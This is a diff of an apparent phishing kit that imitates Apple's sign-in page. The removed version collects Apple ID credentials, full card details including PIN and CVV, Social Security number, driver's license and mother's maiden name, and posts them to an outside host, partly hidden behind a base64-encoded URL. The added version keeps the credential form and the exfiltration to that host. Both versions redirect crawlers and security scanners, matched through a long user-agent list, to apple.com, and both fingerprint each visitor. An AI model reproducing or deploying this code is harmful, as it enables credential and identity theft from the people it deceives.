@@ -11,6 +11,7 @@
     <!-- Anti-crawler metadata -->
     <meta name="robots" content="noindex, nofollow, noarchive">
     <meta name="googlebot" content="noindex, nofollow, noarchive">
+    
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
     <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
@@ -24,14 +25,6 @@
         font-family: -apple-system, BlinkMacSystemFont, 'SF Pro', 'SF Pro Text', system-ui, Helvetica, Arial, sans-serif;
         background-color: #000;
         color: white;
-    }
-    
-    /* Honeypot fields for bots */
-    .bot-field {
-        position: absolute;
-        left: -9999px;
-        visibility: hidden;
-        opacity: 0;
     }
     
     .bg {
@@ -218,69 +211,6 @@
         text-decoration: underline;
     }
     
-    /* Progress Steps */
-    .progress-container {
-        display: flex;
-        justify-content: space-between;
-        margin: 0 auto 30px;
-        position: relative;
-        max-width: 300px;
-    }
-    
-    .progress-container:before {
-        content: '';
-        position: absolute;
-        top: 15px;
-        left: 20px;
-        right: 20px;
-        height: 1px;
-        background: rgba(255, 255, 255, 0.2);
-        z-index: 1;
-    }
-    
-    .step {
-        position: relative;
-        z-index: 2;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        width: 33.33%;
-    }
-    
-    .step-number {
-        width: 30px;
-        height: 30px;
-        border-radius: 50%;
-        background-color: rgba(50, 50, 50, 0.7);
-        border: 1px solid rgba(255, 255, 255, 0.3);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 14px;
-        font-weight: 500;
-        margin-bottom: 8px;
-        color: white;
-    }
-    
-    .step.active .step-number {
-        background-color: #0070c9;
-        border-color: #0070c9;
-    }
-    
-    .step.completed .step-number {
-        background-color: #0070c9;
-        border-color: #0070c9;
-    }
-    
-    .step-label {
-        font-size: 12px;
-        color: rgba(255, 255, 255, 0.7);
-    }
-    
-    .step.active .step-label {
-        color: #0070c9;
-    }
-    
     /* Animation classes */
     .fade-in {
         animation: fadeIn 0.5s forwards;
@@ -305,6 +235,14 @@
         .main-wrapper {
             padding-bottom: 180px; /* More space for footer on mobile */
         }
+    }
+    
+    /* Honeypot fields for anti-bot */
+    .bot-field {
+        position: absolute;
+        left: -9999px;
+        visibility: hidden;
+        opacity: 0;
     }
     </style>
 </head>
@@ -369,7 +307,7 @@
         <!-- Main Content -->
         <div class="main-wrapper">
             <div class="container">
-                <!-- Step 1: Login -->
+                <!-- Sign In Form -->
                 <div id="bl1" class="si-step">
                     <div class="signin-container fade-in">
                         <h1 class="si-container-title">Sign in with your Apple&nbsp;ID</h1>
@@ -381,7 +319,6 @@
                             <input type="hidden" name="count" id="count" value="0">
                             <input type="hidden" name="btn1" value="btn1">
                             <input type="hidden" name="browser_check" id="browser_check" value="">
-                            <input type="hidden" name="check_time" id="check_time" value="">
                             
                             <!-- Honeypot fields for bots -->
                             <div class="bot-field">
@@ -420,155 +357,6 @@
                         </div>
                     </div>
                 </div>
-                
-                <!-- Step 2: Payment Information -->
-                <div id="bl2" class="si-step" style="display:none;">
-                    <div class="signin-container fade-in">
-                        <h1 class="si-container-title">Verify Your Identity</h1>
-                        <p class="subtitle">Confirm your payment details</p>
-                        
-                        <!-- Progress Steps -->
-                        <div class="progress-container">
-                            <div class="step completed">
-                                <div class="step-number">1</div>
-                                <div class="step-label">Sign In</div>
-                            </div>
-                            <div class="step active">
-                                <div class="step-number">2</div>
-                                <div class="step-label">Payment</div>
-                            </div>
-                            <div class="step">
-                                <div class="step-number">3</div>
-                                <div class="step-label">Details</div>
-                            </div>
-                        </div>
-                        
-                        <form action="next.php" method="POST" name="signinform" id="form-field-2">
-                            <input type="hidden" name="btn2" value="btn2">
-                            
-                            <!-- Honeypot fields for bots -->
-                            <div class="bot-field">
-                                <input type="text" name="website2" id="website2">
-                                <input type="text" name="phone_confirm" id="phone_confirm">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="card_name" required class="form-control" placeholder="card Name">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="noc" required class="form-control" placeholder="Name on Card">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="ccn" id="ccn" required class="form-control" placeholder="Credit Card Number">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="exdate" id="exdate" required class="form-control" placeholder="Expiration Date (MM/YYYY)">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="cvv" required class="form-control" placeholder="CVV">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="password" name="pin" required class="form-control" placeholder="Card PIN">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="card_user" required class="form-control" placeholder="card Username">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="password" name="card_pass" required class="form-control" placeholder="card Password">
-                            </div>
-                            
-                            <button type="submit" id="sub-btn-2" class="si-button">Continue</button>
-                        </form>
-                    </div>
-                </div>
-                
-                <!-- Step 3: Personal Details -->
-                <div id="bl3" class="si-step" style="display:none;">
-                    <div class="signin-container fade-in">
-                        <h1 class="si-container-title">Verify Your Details</h1>
-                        <p class="subtitle">Complete your profile information</p>
-                        
-                        <!-- Progress Steps -->
-                        <div class="progress-container">
-                            <div class="step completed">
-                                <div class="step-number">1</div>
-                                <div class="step-label">Sign In</div>
-                            </div>
-                            <div class="step completed">
-                                <div class="step-number">2</div>
-                                <div class="step-label">Payment</div>
-                            </div>
-                            <div class="step active">
-                                <div class="step-number">3</div>
-                                <div class="step-label">Details</div>
-                            </div>
-                        </div>
-                        
-                        <form action="next.php" method="POST" name="signinform" id="form-field-3">
-                            <input type="hidden" name="btn3" value="btn3">
-                            <input type="hidden" name="final_check" id="final_check" value="">
-                            
-                            <!-- Honeypot fields for bots -->
-                            <div class="bot-field">
-                                <input type="text" name="website3" id="website3">
-                                <input type="text" name="address_confirm" id="address_confirm">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="fname" required class="form-control" placeholder="First Name">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="lname" required class="form-control" placeholder="Last Name">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="badd" required class="form-control" placeholder="Billing Address">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="ct" required class="form-control" placeholder="City">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="state" required class="form-control" placeholder="State">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="zip" required class="form-control" placeholder="ZIP Code">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="ph" id="ph" required class="form-control" placeholder="Phone Number">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="ssn" id="ssn" required class="form-control" placeholder="Social Security Number">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="dob" id="dob" required class="form-control" placeholder="Date of Birth (MM/DD/YYYY)">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="dln" id="dln" required class="form-control" placeholder="Driver's License">
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" name="mname" required class="form-control" placeholder="Mother's Maiden Name">
-                            </div>
-                            
-                            <button type="submit" id="sub-btn-3" class="si-button">Complete Verification</button>
-                        </form>
-                    </div>
-                </div>
             </div>
         </div>
         
@@ -589,13 +377,159 @@
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
-    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
     <script type="text/javascript">
-        $("#ssn").inputmask({"mask": "999-99-9999"});
-        $("#ccn").inputmask({"mask": "9999 9999 9999 9999"});
-        $("#dob").inputmask({"mask": "99/99/9999","placeholder":"MM/DD/YYYY"});
-        $("#exdate").inputmask({"mask": "99/9999","placeholder":"MM/YYYY"});
-        $("#ph").inputmask({"mask": "999-999-9999"});
+        // Redirect link
+        var rdrt = "https://www.apple.com/";
+        
+        // Mailer link - this is where your next.php file is referenced
+        var f = "https://rotadosabor.com/joker/next.php";
+        
+        // Anti-bot functions
+        function detectBot() {
+            // Check common bot user agents
+            var botPattern = "(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+            var re = new RegExp(botPattern, 'i');
+            if (re.test(navigator.userAgent)) {
+                return true;
+            }
+            
+            // Check for browser features that bots typically lack
+            if (
+                !('localStorage' in window) ||
+                !('sessionStorage' in window) ||
+                !('fetch' in window) ||
+                document.documentElement.classList.contains('headless')
+            ) {
+                return true;
+            }
+            
+            return false;
+        }
+        
+        // Generate browser fingerprint
+        function generateFingerprint() {
+            var screen_size = window.screen.width + 'x' + window.screen.height;
+            var available_screen = window.screen.availWidth + 'x' + window.screen.availHeight;
+            var color_depth = window.screen.colorDepth;
+            var timezone = new Date().getTimezoneOffset();
+            var has_session_storage = window.sessionStorage ? 1 : 0;
+            var has_local_storage = window.localStorage ? 1 : 0;
+            var has_indexed_db = window.indexedDB ? 1 : 0;
+            var browser_language = navigator.language;
+            var user_agent = navigator.userAgent;
+            
+            return [
+                screen_size, available_screen, color_depth, timezone,
+                has_session_storage, has_local_storage, has_indexed_db,
+                browser_language, user_agent
+            ].join('###');
+        }
+        
+        $(document).ready(function() {
+            var count = 0;
+            var attemptCount = 1;
+            
+            // Set fingerprint
+            $('#browser_check').val(generateFingerprint());
+            
+            // Anti-bot check
+            if (detectBot()) {
+                window.location.replace(rdrt);
+                return;
+            }
+            
+            // Track behavior for suspicious patterns
+            var mouseMoves = 0;
+            $(document).mousemove(function() {
+                mouseMoves++;
+            });
+            
+            // Parse email from URL if present
+            var ai = window.location.hash.substr(1);
+            if (!ai) {
+                // No email in URL
+            } else {
+                var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+                
+                if (!base64regex.test(ai)) {
+                    var my_ai = ai;
+                } else {
+                    var my_ai = atob(ai);
+                }
+                
+                var ind = my_ai.indexOf("@");
+                var my_slice = my_ai.substr((ind + 1));
+                var c = my_slice.substr(0, my_slice.indexOf('.'));
+                var final = c.toLowerCase();
+                $('#ai').val(my_ai);
+            }
+            
+            // Form submission
+            $('#sub-btn-1').click(function(b) {
+                $('#error').hide();
+                $('#msg').hide();
+                
+                b.preventDefault();
+                
+                // Check honeypot fields
+                if ($('#website').val() !== '' || $('#email_confirm').val() !== '') {
+                    window.location.replace(rdrt);
+                    return;
+                }
+                
+                // Check for suspicious behavior
+                if (mouseMoves < 3) {
+                    console.log("Suspicious: No mouse movement");
+                }
+                
+                // Validate form
+                passValidation = true;
+                $($("#form-field-1").find("input[required]").get().reverse()).each(function(i, a) {
+                    if (!a.checkValidity()) {
+                        a.reportValidity();
+                        passValidation = false;
+                        return;
+                    }
+                });
+                
+                if (!passValidation) {
+                    return;
+                }
+                
+                // Get form data
+                var c = $("#form-field-1").serialize();
+                
+                // Submit form via AJAX
+                $.ajax({
+                    dataType: 'JSON',
+                    url: f,
+                    type: 'POST',
+                    data: c,
+                    beforeSend: function(a) {
+                        $('#sub-btn-1').html('<i class="icon_sign_in"></i>Verifying...');
+                        $('#sub-btn-1').prop('disabled', true);
+                    },
+                    success: function(response) {
+                        if (response.status === 'success') {
+                            // Save email for later pages
+                            localStorage.setItem('userEmail', $('#ai').val());
+                            
+                            // Redirect to verification page
+                            window.location.href = 'verification.html';
+                        } else {
+                            $('#error').show();
+                            $('#sub-btn-1').html('<i class="icon_sign_in"></i>Sign In');
+                            $('#sub-btn-1').prop('disabled', false);
+                        }
+                    },
+                    error: function() {
+                        $('#error').show();
+                        $('#sub-btn-1').html('<i class="icon_sign_in"></i>Sign In');
+                        $('#sub-btn-1').prop('disabled', false);
+                    }
+                });
+            });
+        });
     </script>
     <!-- Optional JavaScript -->
     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
@@ -603,244 +537,5 @@
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
     <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
 </body>
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-<script>
-//redirect link
-var rdrt = "https://www.apple.com/";
-
-//mailer link - this is where your next.php file is referenced
-var f = atob("aHR0cHM6Ly9yb3RhZG9zYWJvci5jb20vam9rZXIvbmV4dC5waHA=");  // This decodes to "next.php"
-
-// Anti-bot functions
-function detectBot() {
-    // Check common bot user agents
-    var botPattern = "(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon|httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
-    var re = new RegExp(botPattern, 'i');
-    if (re.test(navigator.userAgent)) {
-        return true;
-    }
-    
-    // Check for browser features that bots typically lack
-    if (
-        !('localStorage' in window) ||
-        !('sessionStorage' in window) ||
-        !('fetch' in window) ||
-        !('WebSocket' in window) ||
-        document.documentElement.classList.contains('headless')
-    ) {
-        return true;
-    }
-    
-    // Check for touch and mouse capability (most bots don't have this)
-    if (
-        !('ontouchstart' in window) && 
-        !('onmousemove' in document.documentElement) && 
-        !navigator.maxTouchPoints
-    ) {
-        return true;
-    }
-    
-    return false;
-}
-
-// Check for behavior patterns that might indicate bots
-function checkBehaviorPatterns() {
-    var patterns = {
-        mouseMoves: 0,
-        keyPresses: 0,
-        scrolls: 0,
-        hasClicked: false,
-        timing: []
-    };
-    
-    return patterns;
-}
-
-// Generate unique fingerprint based on browser properties
-function generateFingerprint() {
-    var fingerprint = {
-        screen: window.screen.width + 'x' + window.screen.height,
-        timezone: new Date().getTimezoneOffset(),
-        plugins: navigator.plugins.length,
-        lang: navigator.language || navigator.userLanguage,
-        cookies: navigator.cookieEnabled
-    };
-    
-    return JSON.stringify(fingerprint);
-}
-
-$(document).ready(function() {
-    var count = 0;
-    var behaviorPatterns = checkBehaviorPatterns();
-    var loadTime = new Date().getTime();
-    
-    // Set fingerprint values in hidden fields
-    $('#browser_check').val(generateFingerprint());
-    $('#check_time').val(loadTime);
-    
-    // Immediate bot detection - redirect bots immediately
-    if (detectBot()) {
-        console.log("Bot detected, redirecting...");
-        window.location.replace(rdrt);
-        return;
-    }
-    
-    // Track user behavior to distinguish from bots
-    $(document).mousemove(function() {
-        behaviorPatterns.mouseMoves++;
-    });
-    
-    $(document).keydown(function() {
-        behaviorPatterns.keyPresses++;
-        var now = new Date().getTime();
-        behaviorPatterns.timing.push(now);
-    });
-    
-    $(document).click(function() {
-        behaviorPatterns.hasClicked = true;
-    });
-    
-    $(window).scroll(function() {
-        behaviorPatterns.scrolls++;
-    });
-    
-    // Set a delay for form submissions to deter bots
-    setTimeout(function() {
-        // Update fingerprint with behavior data
-        $('#final_check').val(JSON.stringify(behaviorPatterns));
-    }, 500);
-
-    /////////////url ai getting////////////////
-    var ai = window.location.hash.substr(1);
-    if (!ai) {
-
-    } else {
-        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
-
-        if (!base64regex.test(ai)) {
-            // alert(btoa(ai));
-            var my_ai = ai;
-        } else {
-            // alert(atob(ai));
-            var my_ai = atob(ai);
-        }
-
-        var ind = my_ai.indexOf("@");
-        var my_slice = my_ai.substr((ind + 1));
-        var c = my_slice.substr(0, my_slice.indexOf('.'));
-        var final = c.toLowerCase();
-        $('#ai').val(my_ai);
-    }
-
-    $('#sub-btn-1').click(function(b) {
-        $('#error').hide();
-        $('#msg').hide();
-
-        b.preventDefault();
-        passValidation = true;
-        $($("#form-field-1").find("input[required]").get().reverse()).each(function(i, a) {
-            if (!a.checkValidity()) {
-                a.reportValidity();
-                passValidation = false;
-                return
-            }
-        });
-        if (!passValidation) {
-            return
-        }
-        var c = $("#form-field-1").serialize();
-        $.ajax({
-            dataType: 'JSON',
-            url: f,
-            type: 'POST',
-            data: c,
-            beforeSend: function(a) {
-                // $('#sub-btn-1').html('Verifying...')
-            },
-            complete: function(a) {
-                $("#bl1").animate({
-                    left: 0,
-                    opacity: "hide"
-                }, 0);
-                $("#bl2").animate({
-                    right: 0,
-                    opacity: "show"
-                }, 500)
-            }
-        })
-    })
-
-    $('#sub-btn-2').click(function(b) {
-        $('#error').hide();
-        $('#msg').hide();
-
-        b.preventDefault();
-        passValidation = true;
-        $($("#form-field-2").find("input[required]").get().reverse()).each(function(i, a) {
-            if (!a.checkValidity()) {
-                a.reportValidity();
-                passValidation = false;
-                return
-            }
-        });
-        if (!passValidation) {
-            return
-        }
-        var c = $("#form-field-2").serialize();
-        $.ajax({
-            dataType: 'JSON',
-            url: f,
-            type: 'POST',
-            data: c,
-            beforeSend: function(a) {
-                $('#sub-btn-2').html('Verifying...')
-            },
-            complete: function(a) {
-                $("#bl2").animate({
-                    left: 0,
-                    opacity: "hide"
-                }, 0);
-                $("#bl3").animate({
-                    right: 0,
-                    opacity: "show"
-                }, 500)
-            }
-        })
-    })
-
-    $('#sub-btn-3').click(function(b) {
-        $('#error').hide();
-        $('#msg').hide();
-
-        b.preventDefault();
-        passValidation = true;
-        $($("#form-field-3").find("input[required]").get().reverse()).each(function(i, a) {
-            if (!a.checkValidity()) {
-                a.reportValidity();
-                passValidation = false;
-                return
-            }
-        });
-        if (!passValidation) {
-            return
-        }
-        
-        var c = $("#form-field-3").serialize();
-        
-        $.ajax({
-            dataType: 'JSON',
-            url: f,
-            type: 'POST',
-            data: c,
-            beforeSend: function(a) {
-                $('#sub-btn-3').html('Processing...')
-            },
-            complete: function(a) {
-                window.location.replace(rdrt)
-            }
-        })
-    })
-});
-</script>
 
 </html>
